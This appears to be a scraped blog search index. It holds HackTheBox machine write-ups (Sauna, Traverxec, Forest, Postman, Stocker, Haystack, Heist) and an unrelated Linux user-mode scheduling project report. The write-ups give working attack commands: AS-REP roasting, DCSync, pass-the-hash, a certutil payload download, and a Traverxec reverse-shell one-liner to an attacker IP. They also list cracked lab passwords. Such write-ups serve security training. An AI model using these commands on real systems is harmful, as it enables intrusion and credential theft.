EGOTISTICAL-BANK.LOCAL dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL # Program Data, EGOTISTICAL-BANK.LOCAL dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL # NTDS Quotas, EGOTISTICAL-BANK.LOCAL dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL # Managed Service Accounts, EGOTISTICAL-BANK.LOCAL dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL # Keys, EGOTISTICAL-BANK.LOCAL dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL # TPM Devices, EGOTISTICAL-BANK.LOCAL dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL # Builtin, EGOTISTICAL-BANK.LOCAL dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL # Hugo Smith, EGOTISTICAL-BANK.LOCAL dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL # search reference ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCAL # search reference ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCAL # search reference ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC AL # search result search: 2 result: 0 Success # numResponses: 19 # numEntries: 15 # numReferences: 3 DNS We so far we have nothing We can try enumerating users via Kerberos on port 88 Let\u0026rsquo;s use kerbrute kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt We get several usernames Yet it takes a while to run So I as soon as I saw username policy, where fsmith is Fergus Smith Check the website for other possible usernames So let\u0026rsquo;s create a user list I also added sauna as it\u0026rsquo;s a box name Foothold Since we have a user list We can try to check for AS-REP Roasting impacket-GetNPUsers EGOTISTICAL-BANK.local/ -dc-ip 10.10.10.175 -usersfile user.list -format hashcat -no-pass Let\u0026rsquo;s crack the hash hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt fsmith:Thestrokes23 We can use evil-winrm to connect User Enumerate for privesc Download winpeas: certutil -urlcache -f http://10.10.16.7:8000/winpeas.exe winpeas.exe There are 3 users: hsmith, fsmith, svc_loanmgr And we found autologon creds for svc_loanmgr:Moneymakestheworldgoround! Use creds to connect as svc_loanmgr to the box via evil-winrm Root Enumerate for privesc Found nothing using winpeas So I ran bloodhound to gather domain info bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -dc SAUNA.EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c all --zip Start neo4j: sudo neo4j start Start bloodhound We can see that svc_loanmgr can perform dcsyns Let\u0026rsquo;s exploit that impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175 Use hashes to connect using psexec Rooted ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/sauna/images/sauna.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/","summary":"Sauna Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.175 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 17:36 BST Nmap scan report for 10.10.10.175 (10.10.10.175) Host is up (0.11s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-28 23:35:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.","tags":["HTB","ldapsearch","ldap","kerberos","seclists","as-rep-roast","getnpusers","hashcat","evil-winrm","smbserver","winpeas","autologon-credentials","bloodhound","sharphound","neo4j","dcsync","secretsdump","wmiexec","psexec","mimikatz"],"title":"[HTB] Machine: Sauna"},{"categories":null,"contents":"Traverxec Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.165 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 19:35 BST Nmap scan report for 10.10.10.165 (10.10.10.165) Host is up (0.096s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA) | 256 93dd1a23eed71f086b58470973a388cc (ECDSA) |_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.10 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.165 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.165 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/27 19:39:09 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/img/] /icons (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/icons/] /css (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/css/] /lib (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/lib/] /js (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/js/] Foothold From nmap results we see nostromo 1.9.6 Check searchsploit We can test poc It works Let\u0026rsquo;s get a reverse shell curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.7/6666 0\u0026gt;\u0026amp;1\u0026quot;' User Let\u0026rsquo;s enumerate with linpeas Found .htpasswd and nhttpd.conf Starts hashcat, since it will take a while to crack echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' \u0026gt; david.hash hashcat -m 500 david.hash /usr/share/wordlists/rockyou.txt --username Resulted in david:Nowonly4me su doesn\u0026rsquo;t work In nhttpd.conf we can see homedirs parameter set to /home According to docs, it means that So we can visit http://10.10.10.165/~david/ From the config file we also saw that homedirs_public is set topublic_www Which means that there is public_www folder inside /home/david which probably can be accessed as www-data user I tried sending file via nc but it didn\u0026rsquo;t work Then I tried downloading it using wget since we have creds for david and config states that it uses .htpasswd for authentification After downloading tar file, we see that it contains david\u0026rsquo;s key Which is protected, so let\u0026rsquo;s crack it with john Let\u0026rsquo;s connect using the key Root Let\u0026rsquo;s enumerate for privesc again We see bin folder with script inside We see that journalctl is executed as sudo Thus david is a sudoer Let\u0026rsquo;s check GTFOBins So the trick here was that we need to shrink the terminal, so that journalctl will pipe stdout to less Based on script we have 5 lines We shrink terminal to less than 5 Output from the journalctl will be sent to less as root And we can type !/bin/bash to get us a root shell ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/traverxec/images/traverxec.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/traverxec/","summary":"Traverxec Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.165 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 19:35 BST Nmap scan report for 10.10.10.165 (10.10.10.165) Host is up (0.096s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA) | 256 93dd1a23eed71f086b58470973a388cc (ECDSA) |_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.","tags":["HTB","nostromo","searchsploit","htpasswd","hashcat","ssh","john","gtfobins","journalctrl"],"title":"[HTB] Machine: Traverxec"},{"categories":null,"contents":"User-mode Scheduling (UMS) 1. Introduction User-mode scheduling (UMS) is a lightweight mechanism that applications can use to schedule their own threads [1]. It allows the programmer of a C user space application to schedule threads without involving the kernel scheduler. The overview of the mechanism is described by Dave Probert in [4] or can be found by searching for his interview on Microsoft Learn [5], since his interview from Channel 9 was moved there [6]. The project was implemented based on specifications described in [2]. 2. Design The design was inspired by Dave Probert\u0026rsquo;s interview [4] and the patent for UMS on Windows [7]: In general: UMS module is responsible for management of UMS mechanism. It receives requests from processes, stores respective data structures (process, scheduler, worker thread descriptors and completion lists) and performs requested actions. The process which intents to use UMS has to register itself in UMS module, create required completion lists, create and assign worker threads to completion lists and then create schedulers associated with completion lists. Schedulers are in charge of determining which worker thread has to be scheduled. Multiple schedulers can share completion lists. Scheduler hosts the execution of the worker threads. 3. Implementation The project consists of UMS kernel module and UMS library. The general execution flow is depicted as follow: The execution flow was inspired by an example provided in [3]. Execution flow in steps: Process calls ums_enter() to request UMS module to manage the current process. Process calls ums_create_completion_list() to request creation of the completion list. This step is continued until all required completion lists are created. Process calls ums_create_worker_thread() to request creation of the worker thread. This step is continued until all required worker threads are created. Process calls ums_create_scheduler() to request creation of the pthread [8] that will become the scheduler. This step is continued until all required scheduler are created. After pthread is created, it calls ums_enter_scheduling_mode() to convert itself to a scheduler. Subsequently, scheduler jumps to an entrypoint, a function that is executed to determine the next worker thread for scheduling (it is called when a the scheduler is started the first time, and when a worker thread yeilds). In this step, scheduler usually calls ums_dequeue_completion_list_items() to obtain a list available threads to run. After finding the worker thread for scheduling, scheduler calls ums_execute_worker(), which consists of 2 parts to perform a full context switch: Saving the current context of the scheduler Loading the context switch of the worker thread All these steps are continued until all the work is completed. Then the scheduler calls ums_exit_scheduling_mode() to convert itself back to pthread and finishes the work via pthread_exit() The main thread of the process waits for all pthreads (schedulers) to complete their work and then calls ums_exit() to notify the UMS module about the completion. 3.1. Module The module consists of: ums_dev.h and ums_dev.c - responsible for UMS miscdevice and its\u0026rsquo; implementation, also includes other headers required by UMS device to function properly. ums_api.h and ums_api.c - contain essential functions, data structures and proc filesystem of the UMS kernel module and their implementations. const.h - is a set of data structures and other constant variables used by UMS kernel module to handle requests from processes. 3.2. Library The library consists of: ums_lib.h and ums_lib.c - contain essential UMS library functions and their implementations. The header has to be included by the user in order to use the UMS library. The header is dependent on const.h and list.h headers described below. const.h - is a set of data structures and other constant variables used by UMS library to make ioctl calls. It is somewhat similar to const.h from the UMS module, but it was made as a separate file to make library independent from the module sources. list.h - is the implementation of the Linux kernel linked list and hash list data structures for user space and was downloaded from [9]. Results The project was run on Ubuntu 20.04.2 LTS by using 2-core virtual machine via VirtualBox. The version of the kernel was Linux 5.8.0-55-generic. Example with 2 schedulers with separate completion lists depicted below: The proc filesystem: The UMS module information log: As a benchmark statistics, the switching time for schedulers was on average within 250-360 nanoseconds. Note that, there were situations with schedulers that share the same completion list, where only one scheduler completed all the work leaving other schedulers without any work. It was due to the fact that the schedulers are viewed as a simple threads by the linux system. Thus it was system scheduler\u0026rsquo;s decision to run only one scheduler thread, which happened to finish all the work before other scheduler threads were woken up. References [1] https://docs.microsoft.com/en-us/windows/win32/procthread/user-mode-scheduling [2] https://gpm.name/teaching/2021-aosv/news/2021/04/09/final-project-track/ [3] https://lastsector.wordpress.com/2013/06/08/curious-case-of-user-mode-scheduling/ [4] https://www.youtube.com/watch?v=PYlP8MXRCZc [5] https://docs.microsoft.com/en-us/learn/ [6] https://docs.microsoft.com/en-us/teamblog/channel9joinedmicrosoftlearn [7] https://patents.google.com/patent/US20100083275A1/en [8] https://man7.org/linux/man-pages/man7/pthreads.7.html [9] https://www.mcs.anl.gov/~kazutomo/list/list.h ","date":"June 26, 2023","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/projects/ums/","summary":"User-mode Scheduling (UMS) 1. Introduction User-mode scheduling (UMS) is a lightweight mechanism that applications can use to schedule their own threads [1]. It allows the programmer of a C user space application to schedule threads without involving the kernel scheduler. The overview of the mechanism is described by Dave Probert in [4] or can be found by searching for his interview on Microsoft Learn [5], since his interview from Channel 9 was moved there [6].","tags":["Projects"],"title":"[Projects] User-mode Scheduling (UMS)"},{"categories":null,"contents":"Forest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h26m18s, deviation: 4h02m30s, median: 6m17s | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-06-26T15:39:27 |_ start_date: 2023-06-26T14:24:16 | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2023-06-26T08:39:24-07:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds Dns No results with zone transfer Nothing on smb Let\u0026rsquo;s use the following post: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/ Foothold/User We got the following users Administrator sebastien lucinda svc-alfresco andy mark santi Let\u0026rsquo;s start with AS-REP Roasting impacket-GetNPUsers htb/ -dc-ip 10.10.10.161 -usersfile user.list -format hashcat -no-pass We got hash Let\u0026rsquo;s crack it: hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt Let\u0026rsquo;s connect evil-winrm -u 'svc-alfresco' -p 's3rvice' -i 10.10.10.161 Root Let\u0026rsquo;s enumerate domain using bloodhound I ran python version of the tool from the attack box: bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc forest.htb.local -ns 10.10.10.161 -c all --zip You can upload Sharphound to the box and run it to get the same results Start neo4j sudo neo4j start Launch bloodhound: bloodhound And import zip file svc-alfresco is a member of Service Accounts, which is a member of Privileged IT Accounts, which is a member of Account Operators, Thus svc-alfresco is a member of Account Operators. While Account Operators has Generic All privilege on the Exchange Windows Permissions group. According to the post: The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which means any member of the group can modify the domain privileges, such as the ability to perform DCSync, or synchronization operations by Domain Controllers. So we can perform dcsync attack $pass = ConvertTo-SecureString \u0026quot;Password123\u0026quot; -AsPlainText -Force New-ADUser pentest -AccountPassword $pass -Enabled $True Add-ADGroupMember -Identity \u0026quot;Exchange Windows Permissions\u0026quot; -members pentest $cred = New-Object system.management.automation.pscredential('htb\\pentest', $pass) Add-ObjectACL -PrincipalIdentity pentest -Credential $cred -Rights DCSync We need to perform these commands one by one And then perform dcsync impacket-secretsdump htb.local/pentest:Password123@10.10.10.161 -just-dc Connect using Administrator\u0026rsquo;s hash impacket-psexec htb.local/administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/forest/images/forest.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/","summary":"Forest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.","tags":["HTB","active-directory","dig","dns","rpc","rpcclient","as-rep-roast","hashcat","winrm","evil-winrm","sharphound","smbserver","bloodhound","dcsync","aclpwn","scheduled-task"],"title":"[HTB] Machine: Forest"},{"categories":null,"contents":"Postman Enumeration nmap Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 17:52 BST Nmap scan report for postman (10.10.10.160) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46834ff13861c01c74cbb5d14a684d77 (RSA) | 256 2d8d27d2df151a315305fbfff0622689 (ECDSA) |_ 256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Cyber Geek\u0026#39;s Personal Website |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). |_http-server-header: MiniServ/1.910 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.20 seconds Web server Port 10000 Port 6379 redis-tools Foothold We can use this post as a guide So after trying several options I stopped on SSH: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh Generate key if you have not yet: ssh-keygen -b 2048 -t rsa Create a txt file from key: (echo -e \u0026quot;\\n\\n\u0026quot;; cat ~/.ssh/id_rsa.pub; echo -e \u0026quot;\\n\\n\u0026quot;) \u0026gt; key.txt Connect using id_rsa User We have another user Matt Found a key in /opt folder Which is encrypted Let\u0026rsquo;s use john But it doesn\u0026rsquo;t work If we check the config file for ssh, we see that the Matt\u0026rsquo;s connections are denied Luckily Matt reuses the password as ssh key password Root We saw that webmin is running as a root Let\u0026rsquo;s search exploits for webmin Login as Matt to webmin on port 10000 We can see the version Googling for exploits for that specific version will result in CVE-2019-12840 poc Let\u0026rsquo;s download poc and run it Rooted ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/postman/images/postman.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/postman/","summary":"Postman Enumeration nmap Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 17:52 BST Nmap scan report for postman (10.10.10.160) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46834ff13861c01c74cbb5d14a684d77 (RSA) | 256 2d8d27d2df151a315305fbfff0622689 (ECDSA) |_ 256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Cyber Geek\u0026#39;s Personal Website |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.","tags":["HTB","webmin","redis","ssh","john","cve-2019-12840"],"title":"[HTB] Machine: Postman"},{"categories":null,"contents":"Stocker Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p20,80 -sC -sV 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 11:10 EDT Nmap scan report for 10.10.11.196 (10.10.11.196) Host is up (0.11s latency). PORT STATE SERVICE VERSION 20/tcp closed ftp-data 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds I found nothing on default web page so I started ffuf for vhost enumeration ┌──(kali㉿kali)-[~] └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.stocker.htb\u0026#39; -u http://stocker.htb -fs 178 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://stocker.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.stocker.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 178 ________________________________________________ [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 186ms] * FUZZ: dev :: Progress: [19966/19966] :: Job [1/1] :: 274 req/sec :: Duration: [0:01:00] :: Errors: 0 :: dev.stocker.htb The web stack Foothold / User So based on the web stack Express sometimes comes with NoSQL solutions So after trying few SQL injections, I had success with NoSQL ones https://book.hacktricks.xyz/pentesting-web/nosql-injection And we got access We can order items Let\u0026rsquo;s order a few and intercept requests Let\u0026rsquo;s run exiftool on pdf file It was generated by Skia/PDF m108 Let\u0026rsquo;s test a payload based on this post Looks like it worked Let\u0026rsquo;s exploit it Since it\u0026rsquo;s NodeJS, I wanted to check source code And we see hardcoded password Let\u0026rsquo;s ssh to box I used usernames gathered during the enumeration from the web server None worked Then using exploit above we see that there is angoose user and password works Root Enumerating box resulted in scripts folder and sudo rights Since we have * we can execuite any js script on this box So let\u0026rsquo;s create a malicious js For testing purposes as a template I used the current script Changed text.txt to root.txt And got a flag Which proves that we can execute any js as root, so we could either spawn a reverse shell or set suid bit for /bin/bash ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/stocker/images/stocker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/stocker/","summary":"Stocker Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p20,80 -sC -sV 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 11:10 EDT Nmap scan report for 10.10.11.196 (10.10.11.196) Host is up (0.11s latency). PORT STATE SERVICE VERSION 20/tcp closed ftp-data 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","ubuntu","vhosts","subdomain","express","nodejs","nosql","nosql-auth-bypass","nosql-injection","xss","serverside-xss","pdf","file-read"],"title":"[HTB] Machine: Stocker"},{"categories":null,"contents":"Haystack Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:36 BST Nmap scan report for 10.10.10.115 (10.10.10.115) Host is up (0.55s latency). Not shown: 922 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a8de2928b14b63fe42f3a4743238b2b (RSA) | 256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA) |_ 256 01d259b2660a9749205f1c84eb81ed95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: nginx/1.12.2 9200/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=UTF-8). | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.56 seconds Web server Port 9200 Foothold Let\u0026rsquo;s download the image and check it Run: file needle.jpg xxd needle.jpg strings needle.jpg You will notice a base64 string Nothing else Let\u0026rsquo;s check elasticsearch curl http://10.10.10.115:9200/_cat/indices?v Let\u0026rsquo;s check bank and quotes indeces curl -s -X GET \u0026quot;http://10.10.10.115:9200/bank/_search?size=1000\u0026quot; | jq -c '.hits.hits[]' curl -s -X GET \u0026quot;http://10.10.10.115:9200/quotes/_search?size=1000\u0026quot; | jq -c '.hits.hits[]' We don\u0026rsquo;t find a clue that we had from image in bank index But we find it in quotes Let\u0026rsquo;s decode them SSH to box as security User Enumerate for privesc So let\u0026rsquo;s port forward 5601 ssh -L 5601:localhost:5601 security@10.10.10.115 We have a LFI in the kibana https://github.com/mpgn/CVE-2018-17246 Root We have a logstash running as root Let\u0026rsquo;s open conf files According to input.conf every 10 seconds checks /opt/kibana/logstash_* and inputs files to filter.conf which eventually get executed based on output.conf Let\u0026rsquo;s exploit the exec plugin by crafting the payload that passes the filter Launch listener and wait for connection Rooted ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/haystack/images/haystack.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/haystack/","summary":"Haystack Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:36 BST Nmap scan report for 10.10.10.115 (10.10.10.115) Host is up (0.55s latency). Not shown: 922 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a8de2928b14b63fe42f3a4743238b2b (RSA) | 256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA) |_ 256 01d259b2660a9749205f1c84eb81ed95 (ED25519) 80/tcp open http nginx 1.","tags":["HTB","steganography","elasticsearch","ssh","kibana","cve-2018-17246","javascript","lfi","logstash","herokuapp"],"title":"[HTB] Machine: Haystack"},{"categories":null,"contents":"Heist Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.149 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST Nmap scan report for 10.10.10.149 (10.10.10.149) Host is up (0.10s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -30s | smb2-time: | date: 2023-06-24T09:40:31 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.50 seconds gobuster └─$ gobuster dir -u http://10.10.10.149 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.149 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,aspx,php [+] Timeout: 10s =============================================================== 2023/06/24 11:12:31 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/images/] /index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2058] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.149/Images/] /issues.php (Status: 302) [Size: 16] [--\u0026gt; login.php] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.149/css/] /Index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /Login.php (Status: 200) [Size: 2058] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.149/js/] /Issues.php (Status: 302) [Size: 16] [--\u0026gt; login.php] 